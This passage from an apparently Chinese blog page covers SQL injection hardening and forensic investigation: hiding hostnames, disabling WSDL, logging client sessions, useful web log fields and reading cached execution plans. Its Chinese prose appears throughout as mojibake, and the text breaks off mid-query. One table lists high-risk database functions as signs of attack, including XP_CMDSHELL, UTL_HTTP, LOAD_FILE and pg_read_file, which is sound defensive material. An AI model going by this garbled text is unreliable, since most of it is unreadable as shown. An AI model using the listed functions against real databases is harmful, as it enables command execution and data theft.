‡ï¼Œä¸€ç§æ–¹æ³•æ˜¯åœ¨IPåœ°å€ä¸Šæ‰§è¡Œåå‘DNSæŸ¥è¯¢ã€‚å¦‚æœIPåœ°å€è¢«è§£ææˆåœ¨WebæœåŠ¡å™¨ä¸ŠåŒæ ·æœ‰æ•ˆçš„ä¸»æœºåï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‹¥æœ‰äº†è¿æ¥åˆ°è¯¥Webç«™ç‚¹æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚ä¸è¿‡ï¼Œå¦‚æœåå‘æŸ¥è¯¢è¿”å›äº†ç¨å¾®é€šç”¨çš„å†…å®¹ï¼Œé‚£ä¹ˆè¿™æ—¶å¯é€šè¿‡åå‘DNSæŸ¥è¯¢æ¥é˜»æ­¢ä¸å—æ¬¢è¿çš„æ”»å‡»è€…å‘ç°æˆ‘ä»¬çš„Webç«™ç‚¹ã€‚å¦‚æœæ­£åœ¨ä½¿ç”¨è™šæ‹Ÿä¸»æœºåï¼ˆDummy Host Nameï¼‰æŠ€æœ¯ï¼Œè¯·ç¡®ä¿é»˜è®¤çš„Webç«™ç‚¹ä¹Ÿè¢«é…ç½®æˆè¿”å›ä¸€ä¸ªç©ºç™½çš„é»˜è®¤Webé¡µé¢ã€‚</p><h5 id="ä½¿ç”¨é€šé…ç¬¦SSLè¯ä¹¦"><a href="#ä½¿ç”¨é€šé…ç¬¦SSLè¯ä¹¦" class="headerlink" title="ä½¿ç”¨é€šé…ç¬¦SSLè¯ä¹¦"></a>ä½¿ç”¨é€šé…ç¬¦SSLè¯ä¹¦</h5><p>å¦ä¸€ç§å‘ç°æœ‰æ•ˆä¸»æœºåçš„æ–¹æ³•æ˜¯ä»SSLï¼ˆSecure Sockets Layer,å®‰å…¨å¥—æ¥å­—å±‚ï¼‰è¯ä¹¦ä¸­æå–ã€‚ è¦é˜»æ­¢è¯¥æ“ä½œï¼Œä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨é€šé…ç¬¦SSLè¯ä¹¦ã€‚</p><h5 id="é™åˆ¶é€šè¿‡æœç´¢å¼•æ“hackingå¾—åˆ°çš„å‘ç°"><a href="#é™åˆ¶é€šè¿‡æœç´¢å¼•æ“hackingå¾—åˆ°çš„å‘ç°" class="headerlink" title="é™åˆ¶é€šè¿‡æœç´¢å¼•æ“hackingå¾—åˆ°çš„å‘ç°"></a>é™åˆ¶é€šè¿‡æœç´¢å¼•æ“hackingå¾—åˆ°çš„å‘ç°</h5><p>æœç´¢å¼•æ“æ˜¯æ”»å‡»è€…ç”¨äºå¯»æ‰¾Webç«™ç‚¹ä¸­SQLæ³¨å…¥æ¼æ´çš„å¦ä¸€ç§å·¥å…·ã€‚åœ¨æ‰€æœ‰ä¸»æµæœç´¢å¼•æ“ä¸­ï¼Œå¸¸è§çš„æŠ€æœ¯æ˜¯ä½¿ç”¨Webç«™ç‚¹æ ¹ç›®å½•ä¸­çš„robots.txtæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶ç”¨äºé˜»æ­¢çˆ¬è¡Œå™¨ï¼ˆcrawlerï¼‰ç¼–å†™ç«™ç‚¹ç´¢å¼•ã€‚</p><p>é˜»æ­¢æ‰€æœ‰æœºå™¨äººçˆ¬è¡ŒWebç«™ç‚¹ä¸Šçš„æ‰€æœ‰é¡µé¢ï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: *Disallow: /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="ç¦æ­¢WSDLä¿¡æ¯"><a href="#ç¦æ­¢WSDLä¿¡æ¯" class="headerlink" title="ç¦æ­¢WSDLä¿¡æ¯"></a>ç¦æ­¢WSDLä¿¡æ¯</h5><p>WebæœåŠ¡æ‰€æ”¯æŒçš„é€šä¿¡åè®®ï¼ˆä¾‹å¦‚ï¼ŒSOAPã€HTTP GETç­‰ï¼‰ã€æ–¹æ³•åå’ŒæœŸæœ›çš„å‚æ•°ï¼Œéƒ½å¯ä»¥ä»WebæœåŠ¡çš„WSDLï¼ˆWeb Services Description Language, WebæœåŠ¡æè¿°è¯­è¨€ï¼‰æ–‡ä»¶ä¸­æå–åˆ°ã€‚é€šå¸¸ï¼Œé€šè¿‡åœ¨WebæœåŠ¡URLçš„ç»“å°¾æ·»åŠ ä¸€ä¸ª?WSDLæ¥è°ƒç”¨è¯¥æ–‡ä»¶ã€‚å¥½çš„åšæ³•æ˜¯å°½å¯èƒ½å‘ä¸å—æ¬¢è¿çš„æ”»å‡»è€…éšè—è¿™ä¸€ä¿¡æ¯ã€‚</p><p>ä¸‹é¢å±•ç¤ºäº†å¦‚ä½•é…ç½®ä¸€ä¸ª.NET WebæœåŠ¡ä»¥ä¾¿ä¸æ˜¾ç¤ºWSDLï¼Œå¯ä»¥å¯¹è¯¥é…ç½®è¿›è¡Œä¿®æ”¹ä»¥ä¾¿åº”ç”¨åˆ°åº”ç”¨çš„web.configæˆ–machine.configæ–‡ä»¶ä¸­ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>webServices</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>protocols</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Documentation<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>protocols</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>webServices</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Apache Axisï¼ˆJavaåº”ç”¨ç»å¸¸ä½¿ç”¨çš„ä¸€ç§SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼ŒWebæœåŠ¡å¹³å°ï¼‰æ”¯æŒè‡ªå®šä¹‰é…ç½®WSDLæ–‡ä»¶ï¼Œç”¨äºé˜»æ­¢è‡ªåŠ¨ç”ŸæˆWSDLï¼Œå¯ä»¥åœ¨æœåŠ¡çš„WSDDï¼ˆWebæœåŠ¡æè¿°æ–‡æ¡£ï¼‰æ–‡ä»¶ä¸­é…ç½®wsdlFileè®¾ç½®ä»¥æŒ‡å‘è¿”å›ç©º<code>&lt;wsdl/&gt;</code>æ ‡ç­¾çš„æ–‡ä»¶ã€‚</p><p>åšå†³åå¯¹åœ¨é¢å‘Internetçš„WebæœåŠ¡å™¨ä¸Šä¿æŒWSDLä¿¡æ¯çš„è¿œç¨‹è®¿é—®ã€‚å¯ä»¥ä½¿ç”¨å¯é€‰çš„å®‰å…¨é€šä¿¡é€šé“ï¼ˆæ¯”å¦‚åŠ å¯†è¿‡çš„e-mailï¼‰æ¥å‘å€¼å¾—ä¿¡èµ–çš„åˆä½œè€…æä¾›è¯¥æ–‡ä»¶ï¼Œåˆä½œè€…å¯èƒ½éœ€è¦è¿™äº›ä¿¡æ¯ä»¥ä¸WebæœåŠ¡è¿›è¡Œé€šä¿¡ã€‚</p><h4 id="æé«˜WebæœåŠ¡å™¨æ—¥å¿—çš„è¯¦ç»†ç¨‹åº¦"><a href="#æé«˜WebæœåŠ¡å™¨æ—¥å¿—çš„è¯¦ç»†ç¨‹åº¦" class="headerlink" title="æé«˜WebæœåŠ¡å™¨æ—¥å¿—çš„è¯¦ç»†ç¨‹åº¦"></a>æé«˜WebæœåŠ¡å™¨æ—¥å¿—çš„è¯¦ç»†ç¨‹åº¦</h4><p>WebæœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶å¯ä»¥æä¾›ä¸€äº›æ´å¯Ÿæ½œåœ¨SQLæ³¨å…¥æ”»å‡»çš„ä¿¡æ¯ï¼Œå°¤å…¶æ˜¯å½“åº”ç”¨ç¨‹åºæ—¥å¿—è®°å½•æœºåˆ¶ä¸ä½³æ—¶ã€‚</p><h4 id="å°†WebæœåŠ¡å™¨å’Œæ•°æ®åº“æœåŠ¡å™¨åˆ†åˆ«éƒ¨ç½²åœ¨ç‹¬ç«‹ä¸»æœºä¸Š"><a href="#å°†WebæœåŠ¡å™¨å’Œæ•°æ®åº“æœåŠ¡å™¨åˆ†åˆ«éƒ¨ç½²åœ¨ç‹¬ç«‹ä¸»æœºä¸Š" class="headerlink" title="å°†WebæœåŠ¡å™¨å’Œæ•°æ®åº“æœåŠ¡å™¨åˆ†åˆ«éƒ¨ç½²åœ¨ç‹¬ç«‹ä¸»æœºä¸Š"></a>å°†WebæœåŠ¡å™¨å’Œæ•°æ®åº“æœåŠ¡å™¨åˆ†åˆ«éƒ¨ç½²åœ¨ç‹¬ç«‹ä¸»æœºä¸Š</h4><p>åº”è¯¥é¿å…åœ¨åŒä¸€ä¸»æœºä¸Šè¿è¡ŒWebæœåŠ¡å™¨è½¯ä»¶å’Œæ•°æ®åº“æœåŠ¡å™¨è½¯ä»¶ï¼Œå› ä¸ºè¿™æ ·ä¼šæ˜¾è‘—å¢åŠ Webåº”ç”¨çš„æ”»å‡»é¢ï¼Œå¹¶å°†ä¹‹å‰åªè®¿é—®Webå‰ç«¯æ—¶ä¸å¯èƒ½æš´éœ²çš„æ•°æ®åº“æœåŠ¡å™¨è½¯ä»¶æš´éœ²ç»™æ”»å‡»ç¨‹åºã€‚</p><h4 id="é…ç½®ç½‘ç»œè®¿é—®æ§åˆ¶"><a href="#é…ç½®ç½‘ç»œè®¿é—®æ§åˆ¶" class="headerlink" title="é…ç½®ç½‘ç»œè®¿é—®æ§åˆ¶"></a>é…ç½®ç½‘ç»œè®¿é—®æ§åˆ¶</h4><p>åœ¨åˆ†å±‚æ­£ç¡®çš„ç½‘ç»œä¸­ï¼Œæ•°æ®åº“æœåŠ¡å™¨é€šå¸¸ä½äºå†…éƒ¨å—ä¿¡ä»»ç½‘ç»œä¸­ã€‚å‡­å€Ÿå¯¹æ•°æ®åº“æœåŠ¡å™¨çš„ç›´æ¥è®¿é—®æƒï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•è¿æ¥åˆ°åŒä¸€ç½‘ç»œçš„å…¶ä»–ç³»ç»Ÿã€‚ å®ç°ç½‘ç»œè®¿é—®æ§åˆ¶ï¼Œä»¥ä¾¿å¯¹ä¸å†…éƒ¨ç½‘ä¸­å…¶ä»–ç³»ç»Ÿçš„è¿æ¥æ–½åŠ é™åˆ¶ã€‚å¯ä»¥åœ¨åŒ…å«é˜²ç«å¢™å’Œè·¯ç”±å™¨ ACLçš„ç½‘ç»œå±‚å®ç°è¯¥æ§åˆ¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨IPSecè¿™æ ·çš„ä¸»æœºå±‚æœºåˆ¶æ¥å®ç°è¯¥æ§åˆ¶ã€‚æ­¤å¤–ï¼Œç¡®ä¿æ–½åŠ åˆé€‚çš„ç½‘ç»œè®¿é—®æ§åˆ¶ä»¥é˜»æ­¢å¸¦å¤–ï¼ˆoutboundï¼‰ç½‘ç»œè¿æ¥ã€‚</p><h2 id="ç¡®è®¤å¹¶ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤"><a href="#ç¡®è®¤å¹¶ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤" class="headerlink" title="ç¡®è®¤å¹¶ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤"></a>ç¡®è®¤å¹¶ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤</h2><h3 id="è°ƒæŸ¥å¯ç–‘çš„SQLæ³¨å…¥æ”»å‡»"><a href="#è°ƒæŸ¥å¯ç–‘çš„SQLæ³¨å…¥æ”»å‡»" class="headerlink" title="è°ƒæŸ¥å¯ç–‘çš„SQLæ³¨å…¥æ”»å‡»"></a>è°ƒæŸ¥å¯ç–‘çš„SQLæ³¨å…¥æ”»å‡»</h3><p>åœ¨é‡åˆ°å¯ç–‘çš„æ”»å‡»ä¹‹åï¼Œè°ƒæŸ¥è€…éœ€è¦ç­›é€‰å¤§é‡ä¿¡æ¯ï¼Œä¸ä½†éœ€è¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ”»å‡»ä¼å›¾çš„è¯æ®ï¼Œè¿˜éœ€è¦åˆ¤æ–­è¿™ç§æ”»å‡»æ˜¯å¦æˆåŠŸã€‚</p><h4 id="å–è¯çš„åˆç†å®è·µ"><a href="#å–è¯çš„åˆç†å®è·µ" class="headerlink" title="å–è¯çš„åˆç†å®è·µ"></a>å–è¯çš„åˆç†å®è·µ</h4><p>æ”¶é›†å’Œç®¡ç†æ•°å­—åŒ–çš„è¯æ®éƒ½æœ‰ç€ä¸¥æ ¼çš„è§„åˆ™å’ŒæŒ‡å¯¼åŸåˆ™ã€‚å¸¸è§çš„è¦æ±‚åŒ…æ‹¬ï¼š</p><ol><li><p>åº”è¯¥ç”±æ¥å—è¿‡è®¡ç®—æœºå–è¯åŸ¹è®­å¹¶åœ¨æœºæ„ä¸­æˆæƒæ‰§è¡Œæ•°å­—è°ƒæŸ¥çš„äººæ¥å¤„ç†è°ƒæŸ¥äº‹å®œã€‚</p></li><li><p>åœ¨è°ƒæŸ¥æœŸé—´æ”¶é›†çš„æ‰€æœ‰æ–‡ä»¶ï¼Œåº”è¯¥é•œåƒï¼Œå¹¶ä¸”åº”è¯¥åˆ›å»ºé•œåƒçš„å‰¯æœ¬ç”¨äºåˆ†æã€‚è¿™å¯ä»¥ç¡®ä¿åœ¨éœ€è¦æ—¶æ€»æœ‰åŸå§‹é•œåƒå¯ç”¨ã€‚</p></li><li><p>å¯¹äºæ–°åˆ›å»ºçš„æ¯ä¸€ä»½æ–‡ä»¶é•œåƒï¼Œåº”è¯¥ä¸ºä¹‹ç”Ÿæˆå“ˆå¸Œï¼Œå¯¹äºæ¯ä¸ªæºæ–‡ä»¶ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p></li><li><p>åœ¨è°ƒæŸ¥æœŸé—´ï¼Œç”¨æ–‡æ¡£è®°å½•ä½ æ‰€æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œï¼ŒåŒ…æ‹¬é‚£äº›å½“è¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨æ—¶å®Œæˆçš„æ“ä½œï¼šä¿ç•™è¿æ¥æ—¶é—´å’Œæ‰€ç”¨æ•°æ®åº“è¯­å¢ƒçš„è®°å½•ï¼›ä¿ç•™åœ¨RDBMSä¸­æ‰§è¡Œå‘½ä»¤çš„è®°å½•ï¼›å°†æ‰€æœ‰ç»“æœç®¡é“(pipe)é‡å®šå‘åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚ä¸»æµRDBMSå®¢æˆ·ç«¯å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘çš„å‘½ä»¤ã€‚</p></li><li><p>ç¡®ä¿å°†æ‰€æœ‰è¯æ®éƒ½å†™å…¥æ— æ¯’çš„å­˜å‚¨ä»‹è´¨ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨ä¸€ä¸ªå®‰å…¨çš„åœ°æ–¹ï¼Œæ¯”å¦‚å‚¨ç‰©æŸœæˆ–ä¿é™©ç®±ã€‚</p></li><li><p>ç»´æŠ¤ä¸€ä»½ç›‘ç®¡é“¾(Chain of Custody)æ–‡æ¡£ï¼Œç”¨äºè·Ÿè¸ªæ”¶é›†çš„æ‰€æœ‰è¯æ®ï¼Œä»è¢«é˜²æŠ¤æ—¶é—´å¼€å§‹ç›´åˆ°ä½œä¸ºè¯æ®åœ¨æ³•åº­ä¸Šå‘ˆç°æ—¶çš„ç§»åŠ¨ã€å­˜æ”¾ä½ç½®å’Œæ‰€æœ‰è€…ã€‚</p></li></ol><p>ä¸»æµRDBMSå®¢æˆ·ç«¯é‡å®šå‘stdoutçš„å‘½ä»¤</p><table><thead><tr><th align="center">RDBMS</th><th align="center">å‚å•†æ”¯æŒçš„å®¢æˆ·ç«¯</th><th align="center">æ—¥å¿—è®°å½•çš„ä¼šè¯æ´»åŠ¨</th><th align="center">é‡å®šå‘æ“ä½œç¬¦</th></tr></thead><tbody><tr><td align="center">Microsoft  SQL Server</td><td align="center">SQLCMD</td><td align="center">-eå‘½ä»¤ï¼Œå½“å¯åŠ¨SQLCMDæ—¶ï¼Œ å®ƒåœ¨æ ‡å‡†è¾“å‡º(stdout)ä¸Šå›æ˜¾æ‰€æœ‰å‘é€ç»™æœåŠ¡å™¨çš„è¯­å¥å’ŒæŸ¥è¯¢ã€‚ä¾‹å¦‚ï¼š<br>  <code>SQLCMD  -e</code></td><td align="center">æ§åˆ¶å°ä¸­ä½¿ç”¨:outè¾“å‡ºå‘½ä»¤ï¼Œå°†æŠŠæ ‡å‡†è¾“å‡º(stdout)é‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š<br><code>SQLCMD&gt;:out  z:\queryresults.txt  &lt;query&gt;  </code></td></tr><tr><td align="center">Oracle</td><td align="center">SQL*Plus</td><td align="center">åœ¨SQL*Plusä¸­ä½¿ç”¨ ECHO  ONå‘½ä»¤ã€‚ä¾‹å¦‚ï¼š<br>  <code>SQL&gt; SET ECHO ON  </code></td><td align="center">åœ¨SQL*Plusä¸­ä½¿ç”¨spoolå‘½ä»¤ã€‚  ä¾‹å¦‚ï¼š <br> <code>SQL&gt; spool  z:\queryresults.txt</code></td></tr><tr><td align="center">MySQL</td><td align="center">MySQLå‘½ä»¤è¡Œå®¢æˆ·ç«¯</td><td align="center">Teeé€‰é¡¹ã€‚  ä¾‹å¦‚ï¼š <br><code>Tee z:\response\  logofactions.txt</code></td><td align="center">INTO OUTFILE è¯­å¥ã€‚  ä¾‹å¦‚ï¼š<br>  <code>&lt;query&gt; INTO  OUTFILE z:\queryresults.txt</code></td></tr><tr><td align="center">PostgreSQL</td><td align="center">PostgreSQL  shell</td><td align="center">åœ¨ PostgreSQL  ä¸­ä½¿ç”¨  ECHO  é€‰é¡¹ã€‚  ä¾‹å¦‚ï¼š<br>  <code>\set ECHO all  </code></td><td align="center">åœ¨PostgreSQL  shellä¸­ä½¿ç”¨/gå‚æ•°ã€‚ ä¾‹å¦‚ï¼š<br> <code>=# &lt;query&gt;  /g z:\queryresults.txt</code></td></tr></tbody></table><h4 id="åˆ†ææ•°å­—åŒ–è¯æ®"><a href="#åˆ†ææ•°å­—åŒ–è¯æ®" class="headerlink" title="åˆ†ææ•°å­—åŒ–è¯æ®"></a>åˆ†ææ•°å­—åŒ–è¯æ®</h4><p>æ•°å­—åŒ–è¯æ®(digital artifact)å°±æ˜¯ç›¸å…³æ•°æ®çš„é›†åˆã€‚å®ƒä»¬çš„èŒƒå›´å¾ˆå¹¿ï¼ŒåŒ…æ‹¬ä»å­˜å‚¨åœ¨æ“ä½œç³»ç»Ÿä¸­æ–‡ä»¶ç³»ç»Ÿå†…çš„WebæœåŠ¡å™¨çš„æ—¥å¿—æ–‡ä»¶ï¼Œåˆ°å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ä¿¡æ¯ï¼Œä»¥åŠRDBMSå†…æ ¸ä¸­çš„ä¿¡æ¯ã€‚</p><h5 id="WebæœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶"><a href="#WebæœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶" class="headerlink" title="WebæœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶"></a>WebæœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶</h5><p>WebæœåŠ¡å™¨æ˜¯åŸºäºWebçš„åº”ç”¨ç¨‹åºçš„æ ¸å¿ƒç»„ä»¶ï¼Œä½œä¸ºäº¤äº’å±‚æ¥å—ç”¨æˆ·çš„è¾“å…¥å¹¶å°†è¾“å…¥ä¼ é€’ç»™åå°åº”ç”¨ç¨‹åºã€‚WebæœåŠ¡å™¨é€šå¸¸ç»´æŠ¤ç€æŒä¹…æ—¥å¿—æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å®ƒæ¥æ”¶åˆ°çš„é¡µé¢è¯·æ±‚çš„å†å²è®°å½•ï¼Œä»¥åŠä»¥çŠ¶æ€ç å½¢å¼è®°å½•çš„å¯¹è¯¥è¯·æ±‚å¤„ç†åäº§ç”Ÿçš„è¾“å‡ºã€‚</p><p>å¯¹äºè°ƒæŸ¥SQLæ³¨å…¥æ”»å‡»æœ€æœ‰ç”¨çš„WebæœåŠ¡å™¨æ—¥å¿—å±æ€§</p><table><thead><tr><th align="center">æ—¥å¿—å­—æ®µå</th><th align="center">æè¿°</th><th align="center">ä¸»è¦è°ƒæŸ¥çš„å€¼</th></tr></thead><tbody><tr><td align="center">Date</td><td align="center">æ´»åŠ¨çš„æ—¥æœŸ</td><td align="center">å»ºç«‹äº‹ä»¶çš„æ—¶é—´åŸºçº¿ï¼Œå¹¶åœ¨å„ç§è¯æ®ä¸­å°†äº‹ä»¶å…³è”èµ·æ¥</td></tr><tr><td align="center">Time</td><td align="center">æ´»åŠ¨çš„æ—¶é—´</td><td align="center">å»ºç«‹äº‹ä»¶çš„æ—¶é—´åŸºçº¿ï¼Œå¹¶åœ¨å„ç§è¯æ®ä¸­å°†äº‹ä»¶å…³è”èµ·æ¥</td></tr><tr><td align="center">Client-IP Address (c-ip)</td><td align="center">å‘èµ·è¯·æ±‚çš„å®¢æˆ·ç«¯çš„IPåœ°å€</td><td align="center">æ ‡è¯†Webè¯·æ±‚çš„æº</td></tr><tr><td align="center">Cs-UserName</td><td align="center">å‘èµ·è¯·æ±‚çš„å·²æˆæƒçš„ç”¨æˆ·å</td><td align="center">æ ‡è¯†ä¸æµé‡å…³è”çš„ç”¨æˆ·ä¸Šä¸‹æ–‡(context)</td></tr><tr><td align="center">Cs-method</td><td align="center">è¯·æ±‚çš„æ“ä½œ(action)</td><td align="center">å®¢æˆ·ç«¯è¯•å›¾æ‰§è¡Œçš„HTTPæ“ä½œ</td></tr><tr><td align="center">Cs-uri-stem</td><td align="center">è¯·æ±‚ç›®æ ‡(ä¾‹å¦‚è¯·æ±‚çš„Webé¡µé¢)</td><td align="center">å®¢æˆ·ç«¯è¯·æ±‚è®¿é—®çš„èµ„æº(é¡µé¢ã€å¯æ‰§è¡Œæ–‡ä»¶ç­‰)</td></tr><tr><td align="center">Cs-uri-query</td><td align="center">å®¢æˆ·ç«¯è¯·æ±‚çš„æŸ¥è¯¢</td><td align="center">æ ‡è¯†å®¢æˆ·ç«¯æäº¤çš„æ¶æ„æŸ¥è¯¢</td></tr><tr><td align="center">Sc-status</td><td align="center">å®¢æˆ·ç«¯è¯·æ±‚çš„çŠ¶æ€ç </td><td align="center">æ ‡è¯†å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚åäº§ç”Ÿçš„è¾“å‡º  (çŠ¶æ€)</td></tr><tr><td align="center">Cs(User-Agent)</td><td align="center">å®¢æˆ·ç«¯æµè§ˆå™¨çš„ç‰ˆæœ¬</td><td align="center">è¿½è¸ªç‰¹å®šå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œè¯¥å®¢æˆ·ç«¯å¯ èƒ½ä½¿ç”¨äº†å¤šä¸ªIPåœ°å€</td></tr><tr><td align="center">Cs-bytes</td><td align="center">å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡å™¨çš„å­—èŠ‚</td><td align="center">æ ‡è¯†å¼‚å¸¸çš„æµé‡ä¼ è¾“</td></tr><tr><td align="center">Sc-bytes</td><td align="center">æœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯çš„å­—èŠ‚</td><td align="center">æ ‡è¯†å¼‚å¸¸çš„æµé‡ä¼ è¾“</td></tr><tr><td align="center">Time Taken (time-taken)</td><td align="center">æœåŠ¡å™¨æ‰§è¡Œè¯·æ±‚æ‰€èŠ±çš„æ¯«ç§’æ•°</td><td align="center">æ ‡è¯†å¼‚å¸¸è¯·æ±‚å¤„ç†çš„å®ä¾‹</td></tr></tbody></table><p>åˆ†ææ—¥å¿—æ–‡ä»¶çš„è¦ç‚¹</p><ul><li>æ¯å¤©çš„å¸¦å®½åˆ©ç”¨ç‡</li><li>é¡µé¢æ¯å¤©å‘½ä¸­æ¬¡æ•°</li><li>é¡µé¢æ¯å¤©è¢«æ¯ä¸ªIPå‘½ä¸­çš„æ¬¡æ•°</li><li>æ¶æ„æŸ¥è¯¢å‚æ•°</li><li>spear-searching</li></ul><h5 id="æ•°æ®åº“æ‰§è¡Œè®¡åˆ’"><a href="#æ•°æ®åº“æ‰§è¡Œè®¡åˆ’" class="headerlink" title="æ•°æ®åº“æ‰§è¡Œè®¡åˆ’"></a>æ•°æ®åº“æ‰§è¡Œè®¡åˆ’</h5><p>æ•°æ®åº“æ‰§è¡Œè®¡åˆ’æ˜¯ç”±RDBMSç”Ÿæˆçš„æ‰§è¡Œæ­¥éª¤çš„åˆ—è¡¨ï¼Œå®ƒè¯´æ˜äº† RDBMSåœ¨è®¿é—®æˆ–ä¿®æ”¹ä¿¡æ¯æ—¶æ•ˆç‡æœ€é«˜çš„æ–¹å¼ã€‚</p><h6 id="åœ¨ç¼“å­˜çš„æ‰§è¡Œè®¡åˆ’ä¸­æŸ¥æ‰¾è¯æ®"><a href="#åœ¨ç¼“å­˜çš„æ‰§è¡Œè®¡åˆ’ä¸­æŸ¥æ‰¾è¯æ®" class="headerlink" title="åœ¨ç¼“å­˜çš„æ‰§è¡Œè®¡åˆ’ä¸­æŸ¥æ‰¾è¯æ®"></a>åœ¨ç¼“å­˜çš„æ‰§è¡Œè®¡åˆ’ä¸­æŸ¥æ‰¾è¯æ®</h6><ul><li>å¯»æ‰¾å·²çŸ¥æ¶æ„æ”»å‡»æ´»åŠ¨çš„ç—•è¿¹</li><li>ä¸æ³¨é‡ŠååŒä½¿ç”¨çš„å †å æŸ¥è¯¢</li><li>éæ³•ä½¿ç”¨æ¡ä»¶è¯­å¥</li><li>é«˜é£é™©è¯­å¥å’Œæ•°æ®åº“å‡½æ•°</li></ul><table><thead><tr><th>æ•°æ®åº“</th><th>å‡½  æ•°</th></tr></thead><tbody><tr><td>Microsoft SQL Server</td><td>XP_CMDSHELL<br>XP_reg*<br>SP_OACREATE<br>sp_OAMethod<br>OPENROWSET<br>sp_configure<br>BULK INSERT<br>BCP<br>WAITFOR DELAY</td></tr><tr><td>Oracle</td><td>UTL_FILE<br>UTL_HTTP<br>HTTPURITYPE<br>UTL_INADDR</td></tr><tr><td>MySQL</td><td>LOAD_DATA_INFILE<br>LOAD_FILE<br>BENCHMARK<br>ENCODE()<br>OUTFILE()<br>CONCAT()</td></tr><tr><td>PostgreSQL</td><td>pg_Is_dir<br>pg_read_file<br>pg_read_binary_file<br>pg_stat_file<br>pg_sleep</td></tr></tbody></table><h6 id="å¦‚ä½•è®¿é—®æ‰§è¡Œè®¡åˆ’"><a href="#å¦‚ä½•è®¿é—®æ‰§è¡Œè®¡åˆ’" class="headerlink" title="å¦‚ä½•è®¿é—®æ‰§è¡Œè®¡åˆ’"></a>å¦‚ä½•è®¿é—®æ‰§è¡Œè®¡åˆ’</h6><p>RDBMSæ•°æ®åº“æä¾›çš„è§†å›¾ï¼Œç”¨äºè®¿é—®å­˜å‚¨çš„æ‰§è¡Œè®¡åˆ’</p><table><thead><tr><th>æ•°æ®åº“</th><th>ç¼“å­˜çš„è¯­å¥ç±»å‹</th><th align="center">é»˜è®¤æ˜¯å¦å¯ç”¨</th><th>è®¿é—®æ–¹æ³•</th></tr></thead><tbody><tr><td>Microsoft SQL Server</td><td>å³å¸­å¥ªè¯¢(ad  hoc)å’Œé¢„å¤„ç†è¯­å¥(prepared  statement)</td><td align="center">å¯ç”¨</td><td>sys.dmexecquerystats  sys.dmexecsqltext</td></tr><tr><td>Oracle</td><td>å³å¸­æŸ¥è¯¢ï¼ˆad hocï¼‰å’Œé¢„å¤„ç†è¯­å¥</td><td align="center">å¯ç”¨</td><td>gv$sql</td></tr><tr><td>MySQL</td><td>é¢„å¤„ç†è¯­å¥</td><td align="center">ä¸å¯ç”¨</td><td>æ²¡æœ‰ç›´æ¥è®¿é—®æ–¹æ³•ï¼Œä½¿ç”¨æ™®é€šçš„æ—¥å¿—æŸ¥è¯¢</td></tr><tr><td>PostgreSQL</td><td>é¢„å¤„ç†è¯­å¥</td><td align="center">ä¸å¯ç”¨</td><td>æ²¡æœ‰ç›´æ¥è®¿é—®æ–¹æ³•ï¼Œä½¿ç”¨æ™®é€šçš„æ—¥å¿—æŸ¥è¯¢</td></tr></tbody></table><ul><li>Microsoft SQL Server</li></ul><p>  ä½¿ç”¨è§†å›¾è¿”å›äº†æ‰§è¡Œè®¡åˆ’ç¼“å­˜æ¡ç›®åˆ›å»ºçš„æ—¥æœŸå’Œæ—¶é—´ã€æœ€åä¸€æ¬¡æ‰§è¡Œçš„æ—¶é—´ï¼ˆåœ¨é‡å¤æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼‰ã€æ‰§è¡Œçš„è¯­æ³•å’Œæ‰§è¡Œè®¡åˆ’è¢«é‡ç”¨çš„æ¬¡æ•°</p>  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> creation_time<span class="token punctuation">,</span> last_execution_time<span class="token punctuation">,</span> <span class="token keyword">text</span><span class="token punctuation">,</span> execution_count <span class="token keyword">from</span> sys<span class="token punctuation">.</span>dm_exec_query_stats qs <span class="token keyword">CROSS</span> <span class="token keyword">APPLY</span> sys<span class="token punctuation">.</span>dm_exec_sql_text<span class="token punctuation">(</span>qs<span class="token 